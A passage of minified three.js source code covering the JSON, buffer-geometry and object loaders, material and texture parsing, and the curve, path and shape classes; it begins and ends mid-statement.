e=this;(new sa(e.manager)).load(a,function(a){b(e.parse(JSON.parse(a)))},c,d)},parse:function(a){var b=new I,c=a.data.index,d={Int8Array:Int8Array,Uint8Array:Uint8Array,Uint8ClampedArray:Uint8ClampedArray,Int16Array:Int16Array,Uint16Array:Uint16Array,Int32Array:Int32Array,Uint32Array:Uint32Array,Float32Array:Float32Array,Float64Array:Float64Array};void 0!==c&&(c=new d[c.type](c.array),\nb.setIndex(new U(c,1)));var e=a.data.attributes,f;for(f in e){var g=e[f],c=new d[g.type](g.array);b.addAttribute(f,new U(c,g.itemSize,g.normalized))}d=a.data.groups||a.data.drawcalls||a.data.offsets;if(void 0!==d)for(f=0,c=d.length;f!==c;++f)e=d[f],b.addGroup(e.start,e.count,e.materialIndex);a=a.data.boundingSphere;void 0!==a&&(d=new q,void 0!==a.center&&d.fromArray(a.center),b.boundingSphere=new Na(d,a.radius));return b}});zb.prototype={constructor:zb,crossOrigin:void 0,extractUrlBase:function(a){a=\na.split(\"/\");if(1===a.length)return\"./\";a.pop();return a.join(\"/\")+\"/\"},initMaterials:function(a,b,c){for(var d=[],e=0;e<a.length;++e)d[e]=this.createMaterial(a[e],b,c);return d},createMaterial:function(){var a={NoBlending:0,NormalBlending:1,AdditiveBlending:2,SubtractiveBlending:3,MultiplyBlending:4,CustomBlending:5},b,c,d;return function(e,f,g){function h(a,b,d,e,h){a=f+a;var k=zb.Handlers.get(a);null!==k?a=k.load(a):(c.setCrossOrigin(g),a=c.load(a));void 0!==b&&(a.repeat.fromArray(b),1!==b[0]&&\n(a.wrapS=1E3),1!==b[1]&&(a.wrapT=1E3));void 0!==d&&a.offset.fromArray(d);void 0!==e&&(\"repeat\"===e[0]&&(a.wrapS=1E3),\"mirror\"===e[0]&&(a.wrapS=1002),\"repeat\"===e[1]&&(a.wrapT=1E3),\"mirror\"===e[1]&&(a.wrapT=1002));void 0!==h&&(a.anisotropy=h);b=N.generateUUID();m[b]=a;return b}void 0===b&&(b=new J);void 0===c&&(c=new td);void 0===d&&(d=new Hd);var m={},k={uuid:N.generateUUID(),type:\"MeshLambertMaterial\"},l;for(l in e){var p=e[l];switch(l){case \"DbgColor\":case \"DbgIndex\":case \"opticalDensity\":case \"illumination\":break;\ncase \"DbgName\":k.name=p;break;case \"blending\":k.blending=a[p];break;case \"colorAmbient\":case \"mapAmbient\":console.warn(\"THREE.Loader.createMaterial:\",l,\"is no longer supported.\");break;case \"colorDiffuse\":k.color=b.fromArray(p).getHex();break;case \"colorSpecular\":k.specular=b.fromArray(p).getHex();break;case \"colorEmissive\":k.emissive=b.fromArray(p).getHex();break;case \"specularCoef\":k.shininess=p;break;case \"shading\":\"basic\"===p.toLowerCase()&&(k.type=\"MeshBasicMaterial\");\"phong\"===p.toLowerCase()&&\n(k.type=\"MeshPhongMaterial\");\"standard\"===p.toLowerCase()&&(k.type=\"MeshStandardMaterial\");break;case \"mapDiffuse\":k.map=h(p,e.mapDiffuseRepeat,e.mapDiffuseOffset,e.mapDiffuseWrap,e.mapDiffuseAnisotropy);break;case \"mapDiffuseRepeat\":case \"mapDiffuseOffset\":case \"mapDiffuseWrap\":case \"mapDiffuseAnisotropy\":break;case \"mapEmissive\":k.emissiveMap=h(p,e.mapEmissiveRepeat,e.mapEmissiveOffset,e.mapEmissiveWrap,e.mapEmissiveAnisotropy);break;case \"mapEmissiveRepeat\":case \"mapEmissiveOffset\":case \"mapEmissiveWrap\":case \"mapEmissiveAnisotropy\":break;\ncase \"mapLight\":k.lightMap=h(p,e.mapLightRepeat,e.mapLightOffset,e.mapLightWrap,e.mapLightAnisotropy);break;case \"mapLightRepeat\":case \"mapLightOffset\":case \"mapLightWrap\":case \"mapLightAnisotropy\":break;case \"mapAO\":k.aoMap=h(p,e.mapAORepeat,e.mapAOOffset,e.mapAOWrap,e.mapAOAnisotropy);break;case \"mapAORepeat\":case \"mapAOOffset\":case \"mapAOWrap\":case \"mapAOAnisotropy\":break;case \"mapBump\":k.bumpMap=h(p,e.mapBumpRepeat,e.mapBumpOffset,e.mapBumpWrap,e.mapBumpAnisotropy);break;case \"mapBumpScale\":k.bumpScale=\np;break;case \"mapBumpRepeat\":case \"mapBumpOffset\":case \"mapBumpWrap\":case \"mapBumpAnisotropy\":break;case \"mapNormal\":k.normalMap=h(p,e.mapNormalRepeat,e.mapNormalOffset,e.mapNormalWrap,e.mapNormalAnisotropy);break;case \"mapNormalFactor\":k.normalScale=[p,p];break;case \"mapNormalRepeat\":case \"mapNormalOffset\":case \"mapNormalWrap\":case \"mapNormalAnisotropy\":break;case \"mapSpecular\":k.specularMap=h(p,e.mapSpecularRepeat,e.mapSpecularOffset,e.mapSpecularWrap,e.mapSpecularAnisotropy);break;case \"mapSpecularRepeat\":case \"mapSpecularOffset\":case \"mapSpecularWrap\":case \"mapSpecularAnisotropy\":break;\ncase \"mapMetalness\":k.metalnessMap=h(p,e.mapMetalnessRepeat,e.mapMetalnessOffset,e.mapMetalnessWrap,e.mapMetalnessAnisotropy);break;case \"mapMetalnessRepeat\":case \"mapMetalnessOffset\":case \"mapMetalnessWrap\":case \"mapMetalnessAnisotropy\":break;case \"mapRoughness\":k.roughnessMap=h(p,e.mapRoughnessRepeat,e.mapRoughnessOffset,e.mapRoughnessWrap,e.mapRoughnessAnisotropy);break;case \"mapRoughnessRepeat\":case \"mapRoughnessOffset\":case \"mapRoughnessWrap\":case \"mapRoughnessAnisotropy\":break;case \"mapAlpha\":k.alphaMap=\nh(p,e.mapAlphaRepeat,e.mapAlphaOffset,e.mapAlphaWrap,e.mapAlphaAnisotropy);break;case \"mapAlphaRepeat\":case \"mapAlphaOffset\":case \"mapAlphaWrap\":case \"mapAlphaAnisotropy\":break;case \"flipSided\":k.side=1;break;case \"doubleSided\":k.side=2;break;case \"transparency\":console.warn(\"THREE.Loader.createMaterial: transparency has been renamed to opacity\");k.opacity=p;break;case \"depthTest\":case \"depthWrite\":case \"colorWrite\":case \"opacity\":case \"reflectivity\":case \"transparent\":case \"visible\":case \"wireframe\":k[l]=\np;break;case \"vertexColors\":!0===p&&(k.vertexColors=2);\"face\"===p&&(k.vertexColors=1);break;default:console.error(\"THREE.Loader.createMaterial: Unsupported\",l,p)}}\"MeshBasicMaterial\"===k.type&&delete k.emissive;\"MeshPhongMaterial\"!==k.type&&delete k.specular;1>k.opacity&&(k.transparent=!0);d.setTextures(m);return d.parse(k)}}()};zb.Handlers={handlers:[],add:function(a,b){this.handlers.push(a,b)},get:function(a){for(var b=this.handlers,c=0,d=b.length;c<d;c+=2){var e=b[c+1];if(b[c].test(a))return e}return null}};\nObject.assign(de.prototype,{load:function(a,b,c,d){var e=this,f=this.texturePath&&\"string\"===typeof this.texturePath?this.texturePath:zb.prototype.extractUrlBase(a),g=new sa(this.manager);g.setWithCredentials(this.withCredentials);g.load(a,function(c){c=JSON.parse(c);var d=c.metadata;if(void 0!==d&&(d=d.type,void 0!==d)){if(\"object\"===d.toLowerCase()){console.error(\"THREE.JSONLoader: \"+a+\" should be loaded with THREE.ObjectLoader instead.\");return}if(\"scene\"===d.toLowerCase()){console.error(\"THREE.JSONLoader: \"+\na+\" should be loaded with THREE.SceneLoader instead.\");return}}c=e.parse(c,f);b(c.geometry,c.materials)},c,d)},setTexturePath:function(a){this.texturePath=a},parse:function(a,b){var c=new T,d=void 0!==a.scale?1/a.scale:1;(function(b){var d,g,h,m,k,l,p,n,u,G,r,A,w,y=a.faces;l=a.vertices;var x=a.normals,v=a.colors,z=0;if(void 0!==a.uvs){for(d=0;d<a.uvs.length;d++)a.uvs[d].length&&z++;for(d=0;d<z;d++)c.faceVertexUvs[d]=[]}m=0;for(k=l.length;m<k;)d=new q,d.x=l[m++]*b,d.y=l[m++]*b,d.z=l[m++]*b,c.vertices.push(d);\nm=0;for(k=y.length;m<k;)if(b=y[m++],u=b&1,h=b&2,d=b&8,p=b&16,G=b&32,l=b&64,b&=128,u){u=new ha;u.a=y[m];u.b=y[m+1];u.c=y[m+3];r=new ha;r.a=y[m+1];r.b=y[m+2];r.c=y[m+3];m+=4;h&&(h=y[m++],u.materialIndex=h,r.materialIndex=h);h=c.faces.length;if(d)for(d=0;d<z;d++)for(A=a.uvs[d],c.faceVertexUvs[d][h]=[],c.faceVertexUvs[d][h+1]=[],g=0;4>g;g++)n=y[m++],w=A[2*n],n=A[2*n+1],w=new D(w,n),2!==g&&c.faceVertexUvs[d][h].push(w),0!==g&&c.faceVertexUvs[d][h+1].push(w);p&&(p=3*y[m++],u.normal.set(x[p++],x[p++],x[p]),\nr.normal.copy(u.normal));if(G)for(d=0;4>d;d++)p=3*y[m++],G=new q(x[p++],x[p++],x[p]),2!==d&&u.vertexNormals.push(G),0!==d&&r.vertexNormals.push(G);l&&(l=y[m++],l=v[l],u.color.setHex(l),r.color.setHex(l));if(b)for(d=0;4>d;d++)l=y[m++],l=v[l],2!==d&&u.vertexColors.push(new J(l)),0!==d&&r.vertexColors.push(new J(l));c.faces.push(u);c.faces.push(r)}else{u=new ha;u.a=y[m++];u.b=y[m++];u.c=y[m++];h&&(h=y[m++],u.materialIndex=h);h=c.faces.length;if(d)for(d=0;d<z;d++)for(A=a.uvs[d],c.faceVertexUvs[d][h]=\n[],g=0;3>g;g++)n=y[m++],w=A[2*n],n=A[2*n+1],w=new D(w,n),c.faceVertexUvs[d][h].push(w);p&&(p=3*y[m++],u.normal.set(x[p++],x[p++],x[p]));if(G)for(d=0;3>d;d++)p=3*y[m++],G=new q(x[p++],x[p++],x[p]),u.vertexNormals.push(G);l&&(l=y[m++],u.color.setHex(v[l]));if(b)for(d=0;3>d;d++)l=y[m++],u.vertexColors.push(new J(v[l]));c.faces.push(u)}})(d);(function(){var b=void 0!==a.influencesPerVertex?a.influencesPerVertex:2;if(a.skinWeights)for(var d=0,g=a.skinWeights.length;d<g;d+=b)c.skinWeights.push(new fa(a.skinWeights[d],\n1<b?a.skinWeights[d+1]:0,2<b?a.skinWeights[d+2]:0,3<b?a.skinWeights[d+3]:0));if(a.skinIndices)for(d=0,g=a.skinIndices.length;d<g;d+=b)c.skinIndices.push(new fa(a.skinIndices[d],1<b?a.skinIndices[d+1]:0,2<b?a.skinIndices[d+2]:0,3<b?a.skinIndices[d+3]:0));c.bones=a.bones;c.bones&&0<c.bones.length&&(c.skinWeights.length!==c.skinIndices.length||c.skinIndices.length!==c.vertices.length)&&console.warn(\"When skinning, number of vertices (\"+c.vertices.length+\"), skinIndices (\"+c.skinIndices.length+\"), and skinWeights (\"+\nc.skinWeights.length+\") should match.\")})();(function(b){if(void 0!==a.morphTargets)for(var d=0,g=a.morphTargets.length;d<g;d++){c.morphTargets[d]={};c.morphTargets[d].name=a.morphTargets[d].name;c.morphTargets[d].vertices=[];for(var h=c.morphTargets[d].vertices,m=a.morphTargets[d].vertices,k=0,l=m.length;k<l;k+=3){var p=new q;p.x=m[k]*b;p.y=m[k+1]*b;p.z=m[k+2]*b;h.push(p)}}if(void 0!==a.morphColors&&0<a.morphColors.length)for(console.warn('THREE.JSONLoader: \"morphColors\" no longer supported. Using them as face colors.'),\nb=c.faces,h=a.morphColors[0].colors,d=0,g=b.length;d<g;d++)b[d].color.fromArray(h,3*d)})(d);(function(){var b=[],d=[];void 0!==a.animation&&d.push(a.animation);void 0!==a.animations&&(a.animations.length?d=d.concat(a.animations):d.push(a.animations));for(var g=0;g<d.length;g++){var h=qa.parseAnimation(d[g],c.bones);h&&b.push(h)}c.morphTargets&&(d=qa.CreateClipsFromMorphTargetSequences(c.morphTargets,10),b=b.concat(d));0<b.length&&(c.animations=b)})();c.computeFaceNormals();c.computeBoundingSphere();\nif(void 0===a.materials||0===a.materials.length)return{geometry:c};d=zb.prototype.initMaterials(a.materials,b,this.crossOrigin);return{geometry:c,materials:d}}});Object.assign(Se.prototype,{load:function(a,b,c,d){\"\"===this.texturePath&&(this.texturePath=a.substring(0,a.lastIndexOf(\"/\")+1));var e=this;(new sa(e.manager)).load(a,function(c){var g=null;try{g=JSON.parse(c)}catch(h){void 0!==d&&d(h);console.error(\"THREE:ObjectLoader: Can't parse \"+a+\".\",h.message);return}c=g.metadata;void 0===c||void 0===\nc.type||\"geometry\"===c.type.toLowerCase()?console.error(\"THREE.ObjectLoader: Can't load \"+a+\". Use THREE.JSONLoader instead.\"):e.parse(g,b)},c,d)},setTexturePath:function(a){this.texturePath=a},setCrossOrigin:function(a){this.crossOrigin=a},parse:function(a,b){var c=this.parseGeometries(a.geometries),d=this.parseImages(a.images,function(){void 0!==b&&b(e)}),d=this.parseTextures(a.textures,d),d=this.parseMaterials(a.materials,d),e=this.parseObject(a.object,c,d);a.animations&&(e.animations=this.parseAnimations(a.animations));\nvoid 0!==a.images&&0!==a.images.length||void 0===b||b(e);return e},parseGeometries:function(a){var b={};if(void 0!==a)for(var c=new de,d=new ce,e=0,f=a.length;e<f;e++){var g,h=a[e];switch(h.type){case \"PlaneGeometry\":case \"PlaneBufferGeometry\":g=new Ma[h.type](h.width,h.height,h.widthSegments,h.heightSegments);break;case \"BoxGeometry\":case \"BoxBufferGeometry\":case \"CubeGeometry\":g=new Ma[h.type](h.width,h.height,h.depth,h.widthSegments,h.heightSegments,h.depthSegments);break;case \"CircleGeometry\":case \"CircleBufferGeometry\":g=\nnew Ma[h.type](h.radius,h.segments,h.thetaStart,h.thetaLength);break;case \"CylinderGeometry\":case \"CylinderBufferGeometry\":g=new Ma[h.type](h.radiusTop,h.radiusBottom,h.height,h.radialSegments,h.heightSegments,h.openEnded,h.thetaStart,h.thetaLength);break;case \"ConeGeometry\":case \"ConeBufferGeometry\":g=new Ma[h.type](h.radius,h.height,h.radialSegments,h.heightSegments,h.openEnded,h.thetaStart,h.thetaLength);break;case \"SphereGeometry\":case \"SphereBufferGeometry\":g=new Ma[h.type](h.radius,h.widthSegments,\nh.heightSegments,h.phiStart,h.phiLength,h.thetaStart,h.thetaLength);break;case \"DodecahedronGeometry\":case \"IcosahedronGeometry\":case \"OctahedronGeometry\":case \"TetrahedronGeometry\":g=new Ma[h.type](h.radius,h.detail);break;case \"RingGeometry\":case \"RingBufferGeometry\":g=new Ma[h.type](h.innerRadius,h.outerRadius,h.thetaSegments,h.phiSegments,h.thetaStart,h.thetaLength);break;case \"TorusGeometry\":case \"TorusBufferGeometry\":g=new Ma[h.type](h.radius,h.tube,h.radialSegments,h.tubularSegments,h.arc);\nbreak;case \"TorusKnotGeometry\":case \"TorusKnotBufferGeometry\":g=new Ma[h.type](h.radius,h.tube,h.tubularSegments,h.radialSegments,h.p,h.q);break;case \"LatheGeometry\":case \"LatheBufferGeometry\":g=new Ma[h.type](h.points,h.segments,h.phiStart,h.phiLength);break;case \"BufferGeometry\":g=d.parse(h);break;case \"Geometry\":g=c.parse(h.data,this.texturePath).geometry;break;default:console.warn('THREE.ObjectLoader: Unsupported geometry type \"'+h.type+'\"');continue}g.uuid=h.uuid;void 0!==h.name&&(g.name=h.name);\nb[h.uuid]=g}return b},parseMaterials:function(a,b){var c={};if(void 0!==a){var d=new Hd;d.setTextures(b);for(var e=0,f=a.length;e<f;e++){var g=d.parse(a[e]);c[g.uuid]=g}}return c},parseAnimations:function(a){for(var b=[],c=0;c<a.length;c++){var d=qa.parse(a[c]);b.push(d)}return b},parseImages:function(a,b){function c(a){d.manager.itemStart(a);return g.load(a,function(){d.manager.itemEnd(a)},void 0,function(){d.manager.itemError(a)})}var d=this,e={};if(void 0!==a&&0<a.length){var f=new $d(b),g=new Yc(f);\ng.setCrossOrigin(this.crossOrigin);for(var f=0,h=a.length;f<h;f++){var m=a[f],k=/^(\\/\\/)|([a-z]+:(\\/\\/)?)/i.test(m.url)?m.url:d.texturePath+m.url;e[m.uuid]=c(k)}}return e},parseTextures:function(a,b){function c(a,b){if(\"number\"===typeof a)return a;console.warn(\"THREE.ObjectLoader.parseTexture: Constant should be in numeric form.\",a);return b[a]}var d={UVMapping:300,CubeReflectionMapping:301,CubeRefractionMapping:302,EquirectangularReflectionMapping:303,EquirectangularRefractionMapping:304,SphericalReflectionMapping:305,\nCubeUVReflectionMapping:306,CubeUVRefractionMapping:307},e={RepeatWrapping:1E3,ClampToEdgeWrapping:1001,MirroredRepeatWrapping:1002},f={NearestFilter:1003,NearestMipMapNearestFilter:1004,NearestMipMapLinearFilter:1005,LinearFilter:1006,LinearMipMapNearestFilter:1007,LinearMipMapLinearFilter:1008},g={};if(void 0!==a)for(var h=0,m=a.length;h<m;h++){var k=a[h];void 0===k.image&&console.warn('THREE.ObjectLoader: No \"image\" specified for',k.uuid);void 0===b[k.image]&&console.warn(\"THREE.ObjectLoader: Undefined image\",\nk.image);var l=new ea(b[k.image]);l.needsUpdate=!0;l.uuid=k.uuid;void 0!==k.name&&(l.name=k.name);void 0!==k.mapping&&(l.mapping=c(k.mapping,d));void 0!==k.offset&&l.offset.fromArray(k.offset);void 0!==k.repeat&&l.repeat.fromArray(k.repeat);void 0!==k.wrap&&(l.wrapS=c(k.wrap[0],e),l.wrapT=c(k.wrap[1],e));void 0!==k.minFilter&&(l.minFilter=c(k.minFilter,f));void 0!==k.magFilter&&(l.magFilter=c(k.magFilter,f));void 0!==k.anisotropy&&(l.anisotropy=k.anisotropy);void 0!==k.flipY&&(l.flipY=k.flipY);g[k.uuid]=\nl}return g},parseObject:function(){var a=new S;return function(b,c,d){function e(a){void 0===c[a]&&console.warn(\"THREE.ObjectLoader: Undefined geometry\",a);return c[a]}function f(a){if(void 0!==a)return void 0===d[a]&&console.warn(\"THREE.ObjectLoader: Undefined material\",a),d[a]}var g;switch(b.type){case \"Scene\":g=new mb;void 0!==b.background&&Number.isInteger(b.background)&&(g.background=new J(b.background));void 0!==b.fog&&(\"Fog\"===b.fog.type?g.fog=new Lb(b.fog.color,b.fog.near,b.fog.far):\"FogExp2\"===\nb.fog.type&&(g.fog=new Kb(b.fog.color,b.fog.density)));break;case \"PerspectiveCamera\":g=new Fa(b.fov,b.aspect,b.near,b.far);void 0!==b.focus&&(g.focus=b.focus);void 0!==b.zoom&&(g.zoom=b.zoom);void 0!==b.filmGauge&&(g.filmGauge=b.filmGauge);void 0!==b.filmOffset&&(g.filmOffset=b.filmOffset);void 0!==b.view&&(g.view=Object.assign({},b.view));break;case \"OrthographicCamera\":g=new Jb(b.left,b.right,b.top,b.bottom,b.near,b.far);break;case \"AmbientLight\":g=new Ad(b.color,b.intensity);break;case \"DirectionalLight\":g=\nnew zd(b.color,b.intensity);break;case \"PointLight\":g=new xd(b.color,b.intensity,b.distance,b.decay);break;case \"SpotLight\":g=new wd(b.color,b.intensity,b.distance,b.angle,b.penumbra,b.decay);break;case \"HemisphereLight\":g=new ud(b.color,b.groundColor,b.intensity);break;case \"Mesh\":g=e(b.geometry);var h=f(b.material);g=g.bones&&0<g.bones.length?new qd(g,h):new Aa(g,h);break;case \"LOD\":g=new Ec;break;case \"Line\":g=new Ua(e(b.geometry),f(b.material),b.mode);break;case \"LineSegments\":g=new ga(e(b.geometry),\nf(b.material));break;case \"PointCloud\":case \"Points\":g=new Mb(e(b.geometry),f(b.material));break;case \"Sprite\":g=new Dc(f(b.material));break;case \"Group\":g=new Fc;break;case \"SkinnedMesh\":console.warn(\"THREE.ObjectLoader.parseObject() does not support SkinnedMesh type. Instantiates Object3D instead.\");default:g=new x}g.uuid=b.uuid;void 0!==b.name&&(g.name=b.name);void 0!==b.matrix?(a.fromArray(b.matrix),a.decompose(g.position,g.quaternion,g.scale)):(void 0!==b.position&&g.position.fromArray(b.position),\nvoid 0!==b.rotation&&g.rotation.fromArray(b.rotation),void 0!==b.quaternion&&g.quaternion.fromArray(b.quaternion),void 0!==b.scale&&g.scale.fromArray(b.scale));void 0!==b.castShadow&&(g.castShadow=b.castShadow);void 0!==b.receiveShadow&&(g.receiveShadow=b.receiveShadow);b.shadow&&(void 0!==b.shadow.bias&&(g.shadow.bias=b.shadow.bias),void 0!==b.shadow.radius&&(g.shadow.radius=b.shadow.radius),void 0!==b.shadow.mapSize&&g.shadow.mapSize.fromArray(b.shadow.mapSize),void 0!==b.shadow.camera&&(g.shadow.camera=\nthis.parseObject(b.shadow.camera)));void 0!==b.visible&&(g.visible=b.visible);void 0!==b.userData&&(g.userData=b.userData);if(void 0!==b.children)for(var m in b.children)g.add(this.parseObject(b.children[m],c,d));if(\"LOD\"===b.type)for(b=b.levels,h=0;h<b.length;h++){var k=b[h];m=g.getObjectByProperty(\"uuid\",k.object);void 0!==m&&g.addLevel(m,k.distance)}return g}}()});ua.prototype={constructor:ua,getPoint:function(a){console.warn(\"THREE.Curve: Warning, getPoint() not implemented!\");return null},getPointAt:function(a){a=\nthis.getUtoTmapping(a);return this.getPoint(a)},getPoints:function(a){isNaN(a)&&(a=5);for(var b=[],c=0;c<=a;c++)b.push(this.getPoint(c/a));return b},getSpacedPoints:function(a){isNaN(a)&&(a=5);for(var b=[],c=0;c<=a;c++)b.push(this.getPointAt(c/a));return b},getLength:function(){var a=this.getLengths();return a[a.length-1]},getLengths:function(a){isNaN(a)&&(a=this.__arcLengthDivisions?this.__arcLengthDivisions:200);if(this.cacheArcLengths&&this.cacheArcLengths.length===a+1&&!this.needsUpdate)return this.cacheArcLengths;\nthis.needsUpdate=!1;var b=[],c,d=this.getPoint(0),e,f=0;b.push(0);for(e=1;e<=a;e++)c=this.getPoint(e/a),f+=c.distanceTo(d),b.push(f),d=c;return this.cacheArcLengths=b},updateArcLengths:function(){this.needsUpdate=!0;this.getLengths()},getUtoTmapping:function(a,b){var c=this.getLengths(),d,e=c.length,f;f=b?b:a*c[e-1];for(var g=0,h=e-1,m;g<=h;)if(d=Math.floor(g+(h-g)/2),m=c[d]-f,0>m)g=d+1;else if(0<m)h=d-1;else{h=d;break}d=h;if(c[d]===f)return d/(e-1);g=c[d];return(d+(f-g)/(c[d+1]-g))/(e-1)},getTangent:function(a){var b=\na-1E-4;a+=1E-4;0>b&&(b=0);1<a&&(a=1);b=this.getPoint(b);return this.getPoint(a).clone().sub(b).normalize()},getTangentAt:function(a){a=this.getUtoTmapping(a);return this.getTangent(a)},computeFrenetFrames:function(a,b){var c=new q,d=[],e=[],f=[],g=new q,h=new S,m,k;for(m=0;m<=a;m++)k=m/a,d[m]=this.getTangentAt(k),d[m].normalize();e[0]=new q;f[0]=new q;m=Number.MAX_VALUE;k=Math.abs(d[0].x);var l=Math.abs(d[0].y),p=Math.abs(d[0].z);k<=m&&(m=k,c.set(1,0,0));l<=m&&(m=l,c.set(0,1,0));p<=m&&c.set(0,0,1);\ng.crossVectors(d[0],c).normalize();e[0].crossVectors(d[0],g);f[0].crossVectors(d[0],e[0]);for(m=1;m<=a;m++)e[m]=e[m-1].clone(),f[m]=f[m-1].clone(),g.crossVectors(d[m-1],d[m]),g.length()>Number.EPSILON&&(g.normalize(),c=Math.acos(N.clamp(d[m-1].dot(d[m]),-1,1)),e[m].applyMatrix4(h.makeRotationAxis(g,c))),f[m].crossVectors(d[m],e[m]);if(!0===b)for(c=Math.acos(N.clamp(e[0].dot(e[a]),-1,1)),c/=a,0<d[0].dot(g.crossVectors(e[0],e[a]))&&(c=-c),m=1;m<=a;m++)e[m].applyMatrix4(h.makeRotationAxis(d[m],c*m)),\nf[m].crossVectors(d[m],e[m]);return{tangents:d,normals:e,binormals:f}}};Ta.prototype=Object.create(ua.prototype);Ta.prototype.constructor=Ta;Ta.prototype.isLineCurve=!0;Ta.prototype.getPoint=function(a){if(1===a)return this.v2.clone();var b=this.v2.clone().sub(this.v1);b.multiplyScalar(a).add(this.v1);return b};Ta.prototype.getPointAt=function(a){return this.getPoint(a)};Ta.prototype.getTangent=function(a){return this.v2.clone().sub(this.v1).normalize()};ad.prototype=Object.assign(Object.create(ua.prototype),\n{constructor:ad,add:function(a){this.curves.push(a)},closePath:function(){var a=this.curves[0].getPoint(0),b=this.curves[this.curves.length-1].getPoint(1);a.equals(b)||this.curves.push(new Ta(b,a))},getPoint:function(a){var b=a*this.getLength(),c=this.getCurveLengths();for(a=0;a<c.length;){if(c[a]>=b)return b=c[a]-b,a=this.curves[a],c=a.getLength(),a.getPointAt(0===c?0:1-b/c);a++}return null},getLength:function(){var a=this.getCurveLengths();return a[a.length-1]},updateArcLengths:function(){this.needsUpdate=\n!0;this.cacheLengths=null;this.getLengths()},getCurveLengths:function(){if(this.cacheLengths&&this.cacheLengths.length===this.curves.length)return this.cacheLengths;for(var a=[],b=0,c=0,d=this.curves.length;c<d;c++)b+=this.curves[c].getLength(),a.push(b);return this.cacheLengths=a},getSpacedPoints:function(a){isNaN(a)&&(a=40);for(var b=[],c=0;c<=a;c++)b.push(this.getPoint(c/a));this.autoClose&&b.push(b[0]);return b},getPoints:function(a){a=a||12;for(var b=[],c,d=0,e=this.curves;d<e.length;d++)for(var f=\ne[d],f=f.getPoints(f&&f.isEllipseCurve?2*a:f&&f.isLineCurve?1:f&&f.isSplineCurve?a*f.points.length:a),g=0;g<f.length;g++){var h=f[g];c&&c.equals(h)||(b.push(h),c=h)}this.autoClose&&1<b.length&&!b[b.length-1].equals(b[0])&&b.push(b[0]);return b},createPointsGeometry:function(a){a=this.getPoints(a);return this.createGeometry(a)},createSpacedPointsGeometry:function(a){a=this.getSpacedPoints(a);return this.createGeometry(a)},createGeometry:function(a){for(var b=new T,c=0,d=a.length;c<d;c++){var e=a[c];\nb.vertices.push(new q(e.x,e.y,e.z||0))}return b}});Wa.prototype=Object.create(ua.prototype);Wa.prototype.constructor=Wa;Wa.prototype.isEllipseCurve=!0;Wa.prototype.getPoint=function(a){for(var b=2*Math.PI,c=this.aEndAngle-this.aStartAngle,d=Math.abs(c)<Number.EPSILON;0>c;)c+=b;for(;c>b;)c-=b;c<Number.EPSILON&&(c=d?0:b);!0!==this.aClockwise||d||(c=c===b?-b:c-b);b=this.aStartAngle+a*c;a=this.aX+this.xRadius*Math.cos(b);var e=this.aY+this.yRadius*Math.sin(b);0!==this.aRotation&&(b=Math.cos(this.aRotation),\nc=Math.sin(this.aRotation),d=a-this.aX,e-=this.aY,a=d*b-e*c+this.aX,e=d*c+e*b+this.aY);return new D(a,e)};Cb.prototype=Object.create(ua.prototype);Cb.prototype.constructor=Cb;Cb.prototype.isSplineCurve=!0;Cb.prototype.getPoint=function(a){var b=this.points,c=(b.length-1)*a;a=Math.floor(c);var c=c-a,d=b[0===a?a:a-1],e=b[a],f=b[a>b.length-2?b.length-1:a+1],b=b[a>b.length-3?b.length-1:a+2];return new D(Te(c,d.x,e.x,f.x,b.x),Te(c,d.y,e.y,f.y,b.y))};fc.prototype=Object.create(ua.prototype);fc.prototype.constructor=\nfc;fc.prototype.getPoint=function(a){var b=this.v0,c=this.v1,d=this.v2,e=this.v3;return new D(Bb(a,b.x,c.x,d.x,e.x),Bb(a,b.y,c.y,d.y,e.y))};gc.prototype=Object.create(ua.prototype);gc.prototype.constructor=gc;gc.prototype.getPoint=function(a){var b=this.v0,c=this.v1,d=this.v2;return new D(Ab(a,b.x,c.x,d.x),Ab(a,b.y,c.y,d.y))};var xe=Object.assign(Object.create(ad.prototype),{fromPoints:function(a){this.moveTo(a[0].x,a[0].y);for(var b=1,c=a.length;b<c;b++)this.lineTo(a[b].x,a[b].y)},moveTo:function(a,\nb){this.currentPoint.set(a,b)},lineTo:function(a,b){var c=new Ta(this.currentPoint.clone(),new D(a,b));this.curves.push(c);this.currentPoint.set(a,b)},quadraticCurveTo:function(a,b,c,d){a=new gc(this.currentPoint.clone(),new D(a,b),new D(c,d));this.curves.push(a);this.currentPoint.set(c,d)},bezierCurveTo:function(a,b,c,d,e,f){a=new fc(this.currentPoint.clone(),new D(a,b),new D(c,d),new D(e,f));this.curves.push(a);this.currentPoint.set(e,f)},splineThru:function(a){var b=[this.currentPoint.clone()].concat(a),\nb=new Cb(b);this.curves.push(b);this.currentPoint.copy(a[a.length-1])},arc:function(a,b,c,d,e,f){this.absarc(a+this.currentPoint.x,b+this.currentPoint.y,c,d,e,f)},absarc:function(a,b,c,d,e,f){this.absellipse(a,b,c,c,d,e,f)},ellipse:function(a,b,c,d,e,f,g,h){this.absellipse(a+this.currentPoint.x,b+this.currentPoint.y,c,d,e,f,g,h)},absellipse:function(a,b,c,d,e,f,g,h){a=new Wa(a,b,c,d,e,f,g,h);0<this.curves.length&&(b=a.getPoint(0),b.equals(this.currentPoint)||this.lineTo(b.x,b.y));this.curves.push(a);\na=a.getPoint(1);this.currentPoint.copy(a)}});bd.prototype=xe;xe.constructor=bd;Db.prototype=Object.assign(Object.create(xe),{constructor:Db,getPointsHoles:function(a){for(var b=[],c=0,d=this.holes.length;c<d;c++)b[c]=this.holes[c].getPoints(a);return b},extractAllPoints:function(a){return{shape:this.getPoints(a),holes:this.getPointsHoles(a)}},extractPoints:function(a){return this.extractAllPoints(a)}});ee.prototype={moveTo:function(a,b){this.currentPath=new bd;this.subPaths.push(this.currentPath);\nthis.currentPath.moveTo(a,b)},lineTo:function(a,b){this.currentPath.lineTo(a,b)},quadraticCurveTo:function(a,b,c,d){this.currentPath.quadraticCurveTo(a,b,c,d)},bezierCurveTo:function(a,b,c,d,e,f){this.currentPath.bezierCurveTo(a,b,c,d,e,f)},splineThru:function(a){this.currentPath.splineThru(a)},toShapes:function(a,b){function c(a){for(var b=[],c=0,d=a.length;c<d;c++){var e=a[c],f=new Db;f.curves=e.curves;b.push(f)}return b}function d(a,b){for(var c=b.length,d=!1,e=c-1,f=0;f<c;e=f++){var 